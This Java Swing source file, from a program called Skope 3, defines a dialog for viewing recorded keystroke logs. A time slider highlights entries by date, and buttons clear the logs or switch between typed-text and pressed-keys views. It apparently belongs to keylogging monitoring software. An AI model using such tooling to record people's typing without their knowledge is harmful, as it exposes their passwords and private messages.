package com.gundersoft.skope3;

import java.awt.Color;
import java.awt.Cursor;
import java.awt.Rectangle;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.util.Calendar;
import javax.swing.JOptionPane;
import javax.swing.JScrollPane;
import javax.swing.JSlider;
import javax.swing.JTextArea;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;

/**
 * Dialog for viewing the keylog over the progression of time.
 * @author Christian Gunderman
 */
public class KeylogDialog {
	/** Parses the keylog and allows for extracting pieces chronologically */
	private Keylogger.LogParser log;
	
	/**
	 * Statically displays the KeylogDialog.
	 * @param parent The parent of this dialog.
	 * @param instance The instance of Skope 3.
	 * @param textLogFile The text log file name.
	 * @param keyLogFile The key log file name.
	 * @param date The date which to highlight in the log.
	 * @throws IOException Unable to open the log files.
	 */
	// TODO: eliminate textLogFile. Use instance instead.
	public static void display(UIBuilder.Window parent, Main instance, 
			final String textLogFile, final String keyLogFile, Calendar date) throws IOException {
		new KeylogDialog().displayDialog(parent, instance, textLogFile, keyLogFile,
				date);
	}
	
	/**
	 * Instantiates and displays the KeylogDialog.
	 * @param parent The parent of this dialog.
	 * @param instance The instance of Skope 3.
	 * @param textLogFile The text log file name.
	 * @param keyLogFile The key log file name.
	 * @param date The date which to highlight in the log.
	 * @throws IOException Unable to open the log files.
	 */
	private void displayDialog(UIBuilder.Window parent, Main instance, 
			final String textLogFile, final String keyLogFile,
			Calendar date) throws IOException {
		
		// get UI context
		UIBuilder builder = instance.getBuilder();
		
		// create dialog box
		final UIBuilder.Window dialog = builder.new Window(parent, "Skope Keylog Viewer",
				600, 400);
		
		// create text area
		final JTextArea textArea = new JTextArea();
		JScrollPane scrollPane = new JScrollPane(textArea);
		scrollPane.setSize(580, 200);
		scrollPane.setLocation(10, 10);
		dialog.add(scrollPane);
		log = new Keylogger.LogParser(textLogFile);
		textArea.setText(log.getEntireLog());
		textArea.setWrapStyleWord(true);
		textArea.setEditable(false);
		textArea.setLineWrap(true);
		textArea.setSelectedTextColor(Color.BLACK);
		textArea.setSelectionColor(Color.GREEN);
		scrollPane.scrollRectToVisible(new Rectangle(0, 0, scrollPane.getWidth(), scrollPane.getHeight()));
		
		// create slider date label
		final UIBuilder.Label dateLabel = builder.new Label("Entire Log", 10, 345, 260, 30);
		dialog.add(dateLabel);
		
		// create time slider
		final Calendar firstDate = log.getFirstDate();
		final Calendar lastDate = log.getLastDate();
		if(firstDate != null && lastDate != null) { // range exists
			int range = (int)(lastDate.getTimeInMillis() - firstDate.getTimeInMillis());
			
			// slider label
			final UIBuilder.Label sliderLabel = builder.new Label(
					"Move the slider to highlight times in the log.", 10, 270, 580, 30);
			dialog.add(sliderLabel);
			
			final JSlider slider = new JSlider(0, range);
			slider.setSize(280, 35);
			slider.setLocation(10,  300);
			slider.setOpaque(false);
			slider.addChangeListener(new ChangeListener() {
				@Override
				public void stateChanged(ChangeEvent e) {
					Calendar relevantDate = Calendar.getInstance();
					relevantDate.setTimeInMillis(firstDate.getTimeInMillis() + slider.getValue());
					
					// update date label
					dateLabel.setText((relevantDate.get(Calendar.MONTH) + 1) + "/"
							+ relevantDate.get(Calendar.DAY_OF_MONTH) + "/" 
							+ relevantDate.get(Calendar.YEAR) + " " + relevantDate.get(Calendar.HOUR) 
							+ ":" + (relevantDate.get(Calendar.MINUTE) < 10 ? 
									("0" + relevantDate.get(Calendar.MINUTE)):relevantDate.get(Calendar.MINUTE)) + ":" 
							+ relevantDate.get(Calendar.SECOND)
							+ relevantDate.get(Calendar.AM_PM));
					
					// TODO: Get this code working, rather than alt code below
					// select item from current date and time
					/*int[] range = log.getRelevantLogRange(relevantDate, 15000);
					if(range != null) {
						System.out.println(range[0] + ":" + range[1]);
						textArea.setCaretPosition(range[0]);
						textArea.moveCaretPosition(range[1]);
						textArea.getCaret().setSelectionVisible(true);
					}*/
					
					// ALT code : tmp fix
					String logText = log.getRelevantLog(relevantDate, 15000);
					if(logText != null) {
						int startIndex = textArea.getText().indexOf(logText);
						textArea.setCaretPosition(startIndex);
						textArea.moveCaretPosition(startIndex + logText.length());
						textArea.getCaret().setSelectionVisible(true);
					}
					
					// DEBUG code
					//textArea.setText(log.getRelevantLog(relevantDate, 15000));
				}
			});
			
			// set slider position and highlight
			if(date != null)
				slider.setValue((int)(date.getTimeInMillis() - firstDate.getTimeInMillis()));
			
			dialog.add(slider);			
			
			// create clear log button
			final UIBuilder.Button clearButton = builder.new Button("Clear Log", 10, 220, 155, 30);
			clearButton.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent actionevent) {
					if(JOptionPane.showConfirmDialog(dialog, 
							"Are you sure that you want to clear the keylog?",
							"Skope 3", JOptionPane.YES_NO_OPTION, 
							JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION) {
						File keyLog = new File(keyLogFile);
						File textLog = new File(textLogFile);
						try {
							keyLog.delete();
							textLog.delete();
						} catch(SecurityException e) {
							JOptionPane.showMessageDialog(dialog, 
									"Unable to delete keylog file.\r\n" + e.getMessage(), 
									"Skope 3", JOptionPane.ERROR_MESSAGE);
							dialog.dispose();
						}
						
						textArea.setText("[Log Empty]");
						slider.setEnabled(false);
						sliderLabel.setText("No log");
					}
				}
			});
			dialog.add(clearButton);
			
			// create toggle button
			final UIBuilder.Button toggleButton = builder.new 
					Button("Switch to Pressed Keys Mode", 175, 220, 230, 30);
			toggleButton.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					
					// set wait cursor
					dialog.setCursor(Cursor.getPredefinedCursor(Cursor.WAIT_CURSOR));
					
					if(toggleButton.getText().equals("Switch to Pressed Keys Mode")) {
						try {
							KeylogDialog.this.log = new Keylogger.LogParser(keyLogFile);
							toggleButton.setText("Switch to Typed Text Mode");
							textArea.setText(log.getEntireLog());
						} catch (IOException err) {
							JOptionPane.showMessageDialog(dialog, "Unable to read key press log.",
									"Skope 3", JOptionPane.ERROR_MESSAGE);
							dialog.dispose();
						}
					} else {
						try {
							KeylogDialog.this.log = new Keylogger.LogParser(textLogFile);
							toggleButton.setText("Switch to Pressed Keys Mode");
							textArea.setText(log.getEntireLog());
						} catch (IOException err) {
							JOptionPane.showMessageDialog(dialog, "Unable to typed text log.",
									"Skope 3", JOptionPane.ERROR_MESSAGE);
							dialog.dispose();
						}
					}
					
					// set normal cursor
					dialog.setCursor(Cursor.getPredefinedCursor(Cursor.DEFAULT_CURSOR));
				}
			});
			dialog.add(toggleButton);
			
			
		}
		
		// display dialog box
		dialog.setVisible(true);
	}
}
